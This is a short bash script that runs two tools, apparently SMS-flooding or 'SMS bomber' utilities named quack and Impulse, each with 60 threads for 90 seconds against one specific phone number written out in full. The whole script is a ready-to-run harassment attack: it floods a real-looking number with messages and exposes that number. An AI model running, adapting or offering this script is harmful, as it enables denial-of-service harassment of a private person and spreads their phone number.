#!/bin/bash
cd /home/encikpetir/SETSMS/quack
python3 quack --tool SMS --target +972507023764 --threads 60 --timeout 90
cd /home/encikpetir/SETSMS/Impulse
python3 impulse.py --method SMS --time 90 --threads 60 --target +972507023764
cd /home/encikpetir/SETSMS
